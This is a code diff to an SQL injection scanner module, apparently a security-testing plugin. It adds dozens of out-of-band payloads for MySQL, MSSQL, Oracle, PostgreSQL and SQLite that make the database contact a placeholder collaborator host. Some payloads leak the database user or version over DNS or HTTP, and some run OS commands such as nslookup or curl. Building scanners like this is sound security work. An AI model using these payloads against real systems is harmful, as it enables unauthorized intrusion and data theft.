@@ -36,6 +36,8 @@ public class SmartSqliDetector implements ScanModule {
 
     // Tested parameters tracking
     private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
+    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
+    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
 
     // SQL error patterns by DB type
     private static final Map<String, List<Pattern>> ERROR_PATTERNS = new LinkedHashMap<>();
@@ -524,7 +526,7 @@ public class SmartSqliDetector implements ScanModule {
     static {
         Map<String, String[]> oob = new LinkedHashMap<>();
         oob.put("MySQL", new String[]{
-                // LOAD_FILE with UNC path (DNS exfiltration)
+                // LOAD_FILE with UNC path (DNS exfiltration) — string context
                 "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                 "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                 "1' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e,COLLAB_PLACEHOLDER,0x5c5c61))-- -",
@@ -541,6 +543,12 @@ public class SmartSqliDetector implements ScanModule {
                 "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',REPLACE(user(),CHAR(64),CHAR(46)),'.',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                 // SELECT INTO via CHAR encoding
                 "' UNION SELECT 'test' INTO OUTFILE CONCAT(CHAR(92,92),COLLAB_PLACEHOLDER,CHAR(92,97))-- -",
+                // Subquery-wrapped — numeric context (WHERE id=1 AND (...) IS NOT NULL)
+                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
+                "1 OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
+                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.', COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
+                // Subquery-wrapped — no quotes (integer injection)
+                "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,COLLAB_PLACEHOLDER,0x5c5c61)))",
         });
         oob.put("MSSQL", new String[]{
                 // xp_dirtree (most common, enabled by default)
@@ -573,15 +581,22 @@ public class SmartSqliDetector implements ScanModule {
                 "'; EXEC xp_cmdshell 'nslookup %COMPUTERNAME%.COLLAB_PLACEHOLDER'-- -",
                 // Linked server OOB
                 "'; EXEC sp_addlinkedserver @server='\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                // Subquery-wrapped — numeric context
+                "1 AND (SELECT 1 FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')) IS NOT NULL-- -",
+                "1 AND (SELECT TOP 1 1 FROM master..sysprocesses WHERE 1=1);EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                // Subquery-wrapped — no quotes (integer injection)
+                "(SELECT 1 WHERE 1=1);EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
+                // Inline subquery with OPENROWSET
+                "1 UNION SELECT 1 FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')-- -",
         });
         oob.put("Oracle", new String[]{
-                // UTL_INADDR (DNS lookup)
+                // UTL_INADDR (DNS lookup) — string context
                 "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
                 "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER')-- -",
-                // UTL_HTTP (HTTP request)
+                // UTL_HTTP (HTTP request) — string context
                 "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)||'",
                 "' AND 1=(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)-- -",
-                // HTTPURITYPE
+                // HTTPURITYPE — string context
                 "'||(SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL)||'",
                 // DBMS_LDAP (LDAP connection)
                 "'||(SELECT DBMS_LDAP.INIT('COLLAB_PLACEHOLDER',80) FROM DUAL)||'",
@@ -601,6 +616,21 @@ public class SmartSqliDetector implements ScanModule {
                 "'||(SELECT DBMS_XMLQUERY.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL)||'",
                 // UTL_HTTP with data exfil (user in path)
                 "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL)||'",
+                // Subquery-wrapped — numeric context (WHERE id=1 AND (...) IS NOT NULL)
+                "1 AND (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL) IS NOT NULL-- -",
+                "1 AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)||'.COLLAB_PLACEHOLDER') FROM DUAL) IS NOT NULL-- -",
+                "1 AND (SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL) IS NOT NULL-- -",
+                "1 AND (SELECT DBMS_LDAP.INIT((SELECT user FROM DUAL)||'.COLLAB_PLACEHOLDER',80) FROM DUAL) IS NOT NULL-- -",
+                "1 AND (SELECT UTL_TCP.OPEN_CONNECTION('COLLAB_PLACEHOLDER',80) FROM DUAL) IS NOT NULL-- -",
+                "1 OR (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL) IS NOT NULL-- -",
+                // Subquery-wrapped — no quotes (integer injection point)
+                "(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL)",
+                "(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
+                "(SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL)",
+                "(SELECT DBMS_LDAP.INIT('COLLAB_PLACEHOLDER',80) FROM DUAL)",
+                // Double-pipe concatenation for numeric context
+                "1||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)",
+                "1||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
         });
         oob.put("PostgreSQL", new String[]{
                 // COPY TO PROGRAM (superuser)
@@ -610,7 +640,7 @@ public class SmartSqliDetector implements ScanModule {
                 // COPY FROM PROGRAM (reverse direction — reads output)
                 "'; COPY omni FROM PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
                 "'; COPY omni FROM PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
-                // dblink_connect (if extension installed)
+                // dblink_connect (if extension installed) — string context
                 "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
                 "' AND 1=(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))-- -",
                 // dblink_connect with data exfil (version in host)
@@ -625,27 +655,49 @@ public class SmartSqliDetector implements ScanModule {
                 "'; SELECT query_to_xml('SELECT 1',true,true,'http://COLLAB_PLACEHOLDER/')-- -",
                 // pg_read_server_log_file via dblink to trigger DNS
                 "'; DO $$ BEGIN PERFORM dblink('host=COLLAB_PLACEHOLDER dbname=a','SELECT pg_ls_dir(''/tmp'')'); EXCEPTION WHEN OTHERS THEN END $$-- -",
+                // Subquery-wrapped — numeric context
+                "1 AND (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
+                "1 AND (SELECT dblink_connect('host='||(SELECT current_user)||'.COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
+                "1 OR (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
+                // Subquery-wrapped — no quotes (integer injection)
+                "(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))",
+                "(SELECT dblink_connect('host='||(SELECT current_user)||'.COLLAB_PLACEHOLDER dbname=a'))",
+                // query_to_xml subquery-wrapped
+                "1 AND (SELECT query_to_xml('SELECT 1',true,true,'http://COLLAB_PLACEHOLDER/')) IS NOT NULL-- -",
         });
         oob.put("SQLite", new String[]{
                 // SQLite doesn't have native OOB, but ATTACH can be used
                 "'; ATTACH DATABASE '\\\\COLLAB_PLACEHOLDER\\a' AS loot-- -",
                 // Load extension (if enabled)
                 "'; SELECT load_extension('\\\\COLLAB_PLACEHOLDER\\a')-- -",
+                // Subquery-wrapped — numeric context
+                "1 AND (SELECT load_extension('\\\\COLLAB_PLACEHOLDER\\a')) IS NOT NULL-- -",
+                "1;ATTACH DATABASE '\\\\COLLAB_PLACEHOLDER\\a' AS loot-- -",
         });
         // DB-agnostic OOB via stacked queries (try common DNS/HTTP exfil for unknown DB)
         oob.put("Generic", new String[]{
-                // MSSQL best-bet
+                // MSSQL best-bet — string context
                 "'; EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
-                // MySQL best-bet
+                // MySQL best-bet — string context
                 "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
-                // Oracle best-bet
+                // Oracle best-bet — string context
                 "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
-                // PostgreSQL best-bet
+                // PostgreSQL best-bet — string context
                 "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
                 // dblink (PostgreSQL, works without stacked queries)
                 "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
                 // Oracle HTTP (alternative to DNS)
                 "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)||'",
+                // Subquery-wrapped — numeric context (covers all DB types)
+                "1 AND (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL) IS NOT NULL-- -",
+                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
+                "1 AND (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
+                // Bare subqueries — no quotes (integer injection)
+                "(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
+                "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,COLLAB_PLACEHOLDER,0x5c5c61)))",
+                "(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))",
+                // Numeric stacked query
+                "1;EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
         });
         OOB_PAYLOADS = Collections.unmodifiableMap(oob);
     }
@@ -723,7 +775,15 @@ public class SmartSqliDetector implements ScanModule {
 
     private void testParameter(HttpRequestResponse original, InjectionPoint ip, String urlPath) {
         try {
-            // Phase 1: Baseline (3 measurements, use max to reduce false positives)
+            // Phase 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
+            // OOB is fire-and-forget: send payloads now, Collaborator polls for interactions
+            // in the background. If confirmed, oobConfirmedParams is set and remaining phases skip.
+            if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
+                testOob(original, ip);
+            }
+
+            // Phase 2: Baseline (3 measurements, use max to reduce false positives)
+            if (oobConfirmedParams.contains(ip.name)) return;
             TimedResult baselineTimedResult = measureResponseTime(original, ip, ip.originalValue);
             HttpRequestResponse baseline = baselineTimedResult.response;
             if (baseline == null || baseline.response() == null) return;
@@ -739,33 +799,33 @@ public class SmartSqliDetector implements ScanModule {
             int baselineStatus = baseline.response().statusCode();
             String baselineBody = baseline.response().bodyToString();
 
-            // Phase 2: Auth bypass (if enabled and looks like a login param)
+            // Phase 3: Auth bypass (if enabled and looks like a login param)
+            if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.authBypass.enabled", true)) {
                 testAuthBypass(original, ip, baselineStatus, baselineLength, baselineBody);
             }
 
-            // Phase 3: Error-based (if enabled)
+            // Phase 4: Error-based (if enabled)
+            if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.error.enabled", true)) {
                 testErrorBased(original, ip, baselineBody);
             }
 
-            // Phase 4: Union-based (if enabled)
+            // Phase 5: Union-based (if enabled)
+            if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.union.enabled", true)) {
                 testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody);
             }
 
-            // Phase 5: Boolean-based blind (if enabled)
+            // Phase 6: Boolean-based blind (if enabled)
+            if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.boolean.enabled", true)) {
                 testBooleanBased(original, ip, baselineLength, baselineStatus, baselineBody);
             }
 
-            // Phase 6: OOB via Collaborator (if enabled and available)
-            if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
-                testOob(original, ip);
-            }
-
             // Phase 7: Time-based blind (LAST — serialized via TimingLock)
             // Gated by global TimingLock.isEnabled() checkbox AND per-module config
+            if (oobConfirmedParams.contains(ip.name)) return;
             if (TimingLock.isEnabled() && config.getBool("sqli.time.enabled", true)) {
                 try {
                     TimingLock.acquire();
@@ -1566,7 +1626,8 @@ public class SmartSqliDetector implements ScanModule {
                             "sqli-detector", url, ip.name,
                             "OOB SQLi (" + dbType + ")",
                             interaction -> {
-                                // Callback when Collaborator interaction is received
+                                // Mark parameter as confirmed — skip all remaining phases
+                                oobConfirmedParams.add(ip.name);
                                 findingsStore.addFinding(Finding.builder("sqli-detector",
                                                 "SQL Injection (Out-of-Band) - " + dbType,
                                                 Severity.CRITICAL, Confidence.CERTAIN)
